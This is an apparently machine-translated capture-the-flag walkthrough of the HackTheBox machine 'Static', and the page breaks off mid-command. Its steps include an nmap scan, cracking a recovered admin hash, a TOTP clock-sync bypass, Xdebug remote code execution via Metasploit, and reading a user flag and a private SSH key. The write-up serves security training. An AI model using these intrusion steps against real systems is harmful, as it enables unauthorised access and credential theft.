<html>
<head>
<title>Static from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的静态—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/static-from-hackthebox-detailed-walkthrough-355c4c98670?source=collection_archive---------1-----------------------#2021-12-19">https://infosecwriteups.com/static-from-hackthebox-detailed-walkthrough-355c4c98670?source=collection_archive---------1-----------------------#2021-12-19</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="5c6d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="662a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi lj"><img src="../Images/5ef2f6d234d3a363fa9e5ea381663445.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*K0hEwBTrMuW3RbGE.png"/></div></div></figure><p id="ac86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">静态是HackTheBox上的一个硬机器。我们从网站上一个包含损坏备份的隐藏文件夹开始。一旦恢复，我们会得到一个一次性代码，允许我们访问网站的另一个隐藏部分，这次是一个支持门户。从这里我们找到一个配置文件，允许我们连接到另一个网络。我们使用Meterpreter在这个新网络上的服务器上获得一个shell，然后找到一个私钥来进行SSH访问。枚举在这个网络上找到更多的服务器，我们通过隧道连接到其中的一个服务器，并利用漏洞实现远程代码执行，最终导致第二个机器上的另一个反向外壳。在那里，我们开发了一个编码很差的定制应用程序，并最终获得了root。</p><p id="1025" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需的技能是广泛的列举和研究技能，以发现和利用错误配置。学到的技能是使用本机命令枚举和移动文件。使用Meterpreter，pspy64，端口转发等等。</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.eu/home/machines/profile/355" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">破解盒子::渗透测试实验室—静态</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.eu</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lt ly"/></div></div></a></div><h1 id="d8c3" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="f094" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="7d92" class="mx km iq mt b gy my mz l na nb">ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.246 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) <br/><br/>nmap -p$ports -sC -sV -oA static 10.10.10.246</span></pre><p id="8337" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nc"><img src="../Images/1a96c7c5216a72a10e6a617f7b43b70c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fyLuz3bpXloIqoSynP3Vpg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">Nmap扫描</figcaption></figure><p id="4b3d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">三个开放的港口。我们在22和2222上都有OpenSSH，它们也是不同的版本，这很有趣。我们在8080上也有Apache，这是我们的起点:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/339e30d36b3229bdd7d4bbdb9299959d.png" data-original-src="https://miro.medium.com/v2/resize:fit:642/format:webp/0*oH-h8MLzJnrkOIGr.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">端口8080上的静态网站</figcaption></figure><p id="5be9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在那里什么也没找到。回头看上面的Nmap扫描，我们看到有一个包含两个条目的robots.txt文件。我们可以用旋度来确认:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="194a" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# curl http://static.htb:8080/robots.txt <br/>User-agent: *<br/>Disallow: /vpn/<br/>Disallow: /.ftp_uploads/</span></pre><h1 id="c3a0" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">VPN登录页面</h1><p id="0dff" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">回到浏览器来试试这些。/vpn/ first:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/ad6b3ae2478a52c33b2dd3d3e291624c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1162/format:webp/0*QXaZX8FB5wFW-FJO.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">VPN登录页面</figcaption></figure><p id="f8e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有一个登录页面。尝试明显的凭证对admin: admin有效，我们到达这里:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/0c7740f302170aa0f82b7fc053cda225.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/0*pJ2EDuOmB0w553s_.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">VPN双因素一次性密码</figcaption></figure><h1 id="6f81" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">FTP备份文件</h1><p id="7387" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在这似乎是一个死胡同，因为我们没有情报找到一条通过那道屏障的路。让我们试试另一个网址:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nk"><img src="../Images/89907c8424d8f61984547b720b73e8fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:888/format:webp/0*eZMirPT0avUkqMlG.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">ftp上传文件夹</figcaption></figure><p id="bb23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有两份文件。一个warning.txt和一个gzip存档。我们可以读取txt文件:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="73af" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# curl http://static.htb:8080//.ftp_uploads/warning.txt<br/>Binary files are being corrupted during transfer!!! <br/>Check if are recoverable.</span></pre><p id="863c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个提示，其他文件需要恢复，然后我们才能gunzip它。抓住它:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a857" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# wget http://static.htb:8080//.ftp_uploads/db.sql.gz   <br/>--2021-11-01 22:36:55--  http://static.htb:8080//.ftp_uploads/db.sql.gz<br/>Resolving static.htb (static.htb)... 10.10.10.246<br/>Connecting to static.htb (static.htb)|10.10.10.246|:8080... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 262 [application/x-gzip]<br/>Saving to: ‘db.sql.gz’<br/>db.sql.gz           100%[==================&gt;]     262  --.-KB/s    in 0s      <br/>2021-11-01 22:36:55 (50.4 MB/s) - ‘db.sql.gz’ saved [262/262]</span></pre><p id="bba4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先检查我们是否可以gunzip:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a13a" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# gunzip db.sql.gz<br/>gzip: db.sql.gz: invalid compressed data--crc error<br/>gzip: db.sql.gz: invalid compressed data--length error</span></pre><p id="36f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好吧，他们没有说谎！搜索修复损坏的gz文件的工具时发现了<a class="ae nl" href="https://github.com/arenn/gzrt" rel="noopener ugc nofollow" target="_blank"> gzrecover </a>。克隆，制作工具，然后恢复文件:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nc"><img src="../Images/fa329424aba9171da12eff35c7029926.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fMG1iVsFpRtHQQ7y6L5tQg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">正在尝试使用gzrecorver恢复文件</figcaption></figure><p id="ec45" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要么这不起作用，要么文件需要做更多的工作。经过一番挠头之后，我寻找另一个工具，发现<a class="ae nl" href="https://github.com/yonjar/fixgz" rel="noopener ugc nofollow" target="_blank">这个</a>可以用:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nc"><img src="../Images/0052e9df2bd248038a21ec2b6f441334.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eV85dimWCdE9hRC7h0YFig.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">尝试使用fixgz恢复文件</figcaption></figure><p id="0be9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">类似但是好多了！从这里我们可以看到，我们有admin的用户名和密码的散列，如果它与我们已经尝试过的相同，那么它也是admin。出于好奇，让我们来破解它:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="86aa" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# echo "d033e22ae348aeb5660fc2140aec35850c4da997" &gt; hash.txt <br/><br/>┌──(root💀kali)-[~/htb/static]<br/>└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt <br/>Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])<br/>Warning: no OpenMP support for this hash type, consider --fork=4<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>admin            (?)<br/>1g 0:00:00:00 DONE (2021-11-01 22:59) 33.33g/s 660800p/s 660800c/s 660800C/s alcala..LOVE1<br/>Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably<br/>Session completed</span></pre><p id="82dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯，这很明显，但对练习我们的哈希破解技巧很有好处。</p><h1 id="8d74" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">TOTP插件</h1><p id="d804" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">回到压缩文件，我们看到它写着totp，并给了我们一个代码。什么是TOTP？基于时间的一次性密码，<a class="ae nl" href="https://www.hypr.com/time-based-time-password-totp-otp/" rel="noopener ugc nofollow" target="_blank">这里的</a>就是一个很好的解释。我发现<a class="ae nl" href="https://github.com/Authenticator-Extension/Authenticator" rel="noopener ugc nofollow" target="_blank">这个</a> GitHub repo链接到一个火狐插件<a class="ae nl" href="https://addons.mozilla.org/en-US/firefox/addon/auth-helper/?src=external-github" rel="noopener ugc nofollow" target="_blank">这里</a>。</p><p id="2480" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">安装完成后，点击图标，然后点击铅笔:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/1e912f5ab837c7ac592444f7e13fe156.png" data-original-src="https://miro.medium.com/v2/resize:fit:542/format:webp/0*guYD3052Izk1sKs3.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">Firefox的totp验证器插件</figcaption></figure><p id="4912" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将我们在上面找到的TOTP代码添加到机密字段，然后单击确定:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nn"><img src="../Images/496c7df2b6afd5c8828e1a845751bb34.png" data-original-src="https://miro.medium.com/v2/resize:fit:464/format:webp/0*kJKneuqR6LZmRd2W.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">添加密码以启用totp</figcaption></figure><p id="bc44" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在你有一个旋转的一次性代码:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/3d861678428ed57efb35c19affc01bbf.png" data-original-src="https://miro.medium.com/v2/resize:fit:504/format:webp/0*j-hjXB_JdGZ3-p3p.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">示例代码</figcaption></figure><p id="41dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一步应该很简单，你只需像以前一样登录vpn页面，并在2FA框中输入你的六位数代码。然而，这只有在你的攻击箱时间和静态服务器相同的情况下才有效。对于我来说，时间相差16分钟，您可以使用curl来获取远程服务器时间:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="78f3" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# curl -i http://10.10.10.246:8080/vpn/login.php  <br/>HTTP/1.1 200 OK<br/>Date: Tue, 02 Nov 2021 21:50:04 GMT<br/>Server: Apache/2.4.29 (Ubuntu)</span></pre><p id="f581" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后与当地时间进行比较:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a6da" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# date<br/>Tue Nov  2 09:34:51 PM GMT 2021</span></pre><p id="ce41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我刚刚更改了我的本地时间以匹配服务器:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="6846" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# timedatectl set-time '21:50:00'</span></pre><h1 id="10ae" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">IT支持门户</h1><p id="087d" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在回到vpn页面，将totp代码粘贴到2FA框中，我们在这里结束:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi np"><img src="../Images/4d574262bbc286ca50ce10bedcaf224e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/format:webp/0*W0J8MecXt5hBDN0W.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">IT支持门户</figcaption></figure><p id="2d3e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们位于一个包含服务器列表的支持门户中。如果我们在“常用名”框中键入他们的一个名字，我们就可以下载一个VPN连接文件。首先我下载网络服务器:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/683fa1819062e7340b099f4faa95f34e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/0*iROKCmnWEnQ50tAt.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">下载web.ovpn</figcaption></figure><p id="2f6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尝试使用文件连接到它不起作用:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nr"><img src="../Images/5b84d55975a5fae832e18cc308f81960.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xBMxQA6YH0r9uSO6orSdzg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">VPN未连接</figcaption></figure><p id="ff62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看上面的连接尝试，我们看到它试图访问vpn.static.htb，因此让我们将它添加到我们的hosts文件中:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="a0cc" class="mx km iq mt b gy my mz l na nb">sed -i '/10.10.10.246 static.htb/ s/$/ vpn.static.htb/' /etc/hosts</span></pre><p id="a694" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在再试一次:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nr"><img src="../Images/30f0c58f72aa0f101de8a0b70ab10751.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n_jPfJmsvIuOHUNJWTrhIg.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">连接到新网络</figcaption></figure><h1 id="8150" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">网络服务器</h1><p id="2819" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们已连接到此网络，并有了新的调谐器接口:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="1553" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# ifconfig tun9<br/>tun9: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500<br/>        inet 172.30.0.9  netmask 255.255.0.0  destination 172.30.0.9<br/>        RX packets 0  bytes 0 (0.0 B)<br/>        RX errors 0  dropped 0  overruns 0  frame 0<br/>        TX packets 5  bytes 240 (240.0 B)<br/>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></pre><p id="3fcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">即使我们使用为web服务器提供的vpn文件进行连接，我们实际上也无法连接到它，尝试只是挂起:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="255f" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# curl http://172.20.0.10</span></pre><p id="3961" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是因为我们的tun9 IP与web服务器位于不同的子网。我们可以向我们的接口添加一条新的路由，以允许我们到达不同的网络。<a class="ae nl" href="https://www.cyberciti.biz/faq/ip-route-add-network-command-for-linux-explained/" rel="noopener ugc nofollow" target="_blank">这个</a>很好的解释了如何添加路线。让我们现在就开始吧:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="dcfd" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# ip route add 172.20.0.0/24 dev tun9</span></pre><p id="8219" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以进入网络服务器:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="dad5" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# traceroute 172.20.0.10             <br/>traceroute to 172.20.0.10 (172.20.0.10),30 hops max,60 byte packets<br/> 1  172.30.0.1 (172.30.0.1)  25.670 ms  27.471 ms  28.446 ms<br/> 2  172.20.0.10 (172.20.0.10)  28.349 ms  28.312 ms  28.214 ms</span></pre><p id="f110" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们继续之前，我遇到了一些问题，这个到web服务器的VPN连接不稳定。我发现为了保持可靠性，我必须像这样减少MTU:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="c430" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~]<br/>└─# ifconfig tun9 mtu 1200<br/><br/>┌──(root💀kali)-[~/htb/static]<br/>└─# ifconfig tun9<br/>tun9: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1200<br/>        inet 172.30.0.10  netmask 255.255.0.0  destination 172.30.0.10<br/>        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)<br/>        RX packets 3  bytes 252 (252.0 B)<br/>        RX errors 0  dropped 0  overruns 0  frame 0<br/>        TX packets 5  bytes 348 (348.0 B)<br/>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></pre><p id="2838" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我建议你这样做，否则你可能会浪费很多时间挠头！</p><p id="0ce5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，让我们看看浏览器:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/2a0b556568ba2904c0ad2c86f2e6dded.png" data-original-src="https://miro.medium.com/v2/resize:fit:796/format:webp/0*eYIKFStirY3lrr81.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">Web服务器内容</figcaption></figure><h1 id="ac61" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">XDebug</h1><p id="51b8" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们找到一个php信息文件:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nt"><img src="../Images/3a251a05e09205a3ceac7d5546b155f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*C2h-6WilgDMgRp5z.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">Web服务器php信息</figcaption></figure><p id="f126" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">浏览文件，我们发现xdebug部分在底部:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nu"><img src="../Images/608e905c8ebd7661aa6a274d242dffe1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*wQK1HvXQGnfh9455.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">Web服务器xdebug已启用</figcaption></figure><h1 id="718d" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">水表读数器</h1><p id="0d03" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">在另一个名为<a class="ae nl" href="https://www.hackthebox.com/home/machines/profile/135" rel="noopener ugc nofollow" target="_blank"> Olympus </a>的盒子中也发现了同样的漏洞，我们可以在这里使用同样的Metasploit方法。<a class="ae nl" href="https://www.acunetix.com/vulnerabilities/web/xdebug-remote-code-execution-via-xdebug-remote_connect_back/" rel="noopener ugc nofollow" target="_blank">这篇</a>文章解释了漏洞利用需要启用哪些设置。当我们检查时，我们可以确认它们已设置好，因此让我们启动Meterpreter:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi nv"><img src="../Images/eda45e68ab067300bf6ca0d95d2c83ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tjFdEEzewP25J6ymYYeSjw.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">使用Meterpreter开发xdebug</figcaption></figure><p id="f607" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">连接会话后，我们可以进入shell查看:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="2b7e" class="mx km iq mt b gy my mz l na nb">meterpreter &gt; shell<br/>Process 514 created.<br/>Channel 0 created.<br/>id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/><br/>pwd<br/>/var/www/html/vpn<br/><br/>ls -lsa /home<br/>4 -rwxrwxrwx 1 root     root       33 Nov  3 13:38 user.txt<br/>4 drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 www-data</span></pre><h1 id="160a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户标志</h1><p id="d7b7" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">不同寻常的是，用户标志位于/home的根目录中，让我们在这里抓住它:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="297e" class="mx km iq mt b gy my mz l na nb">cat /home/user.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="7c27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们的用户主文件夹中，我们发现了一些有用的东西:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="4991" class="mx km iq mt b gy my mz l na nb">ls -lsa /home/www-data<br/>4 drwx------ 2 www-data www-data 4096 Jun 14 08:00 .cache<br/>4 drwx------ 2 www-data www-data 4096 Jun 14 07:54 .ssh<br/><br/>ls -lsa /home/www-data/.ssh<br/>4 -rw-r--r-- 1 www-data www-data  390 Jun 14 07:54 authorized_keys<br/>4 -rw------- 1 www-data www-data 1675 Jun 14 07:34 id_rsa<br/>4 -rw-r--r-- 1 www-data www-data  390 Jun 14 07:34 id_rsa.pub<br/><br/>cat /home/www-data/.ssh/id_rsa<br/>-----BEGIN RSA PRIVATE KEY-----<br/>MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/<br/>nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ<br/>&lt;SNIP&gt;<br/>sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+<br/>s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau<br/>-----END RSA PRIVATE KEY-----</span></pre><p id="3d30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们从这个Metasploit shell转移到一个稳定的SSH连接。复制我们找到的私人密钥，并传入Kali的一个文件:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="61d2" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# echo "-----BEGIN RSA PRIVATE 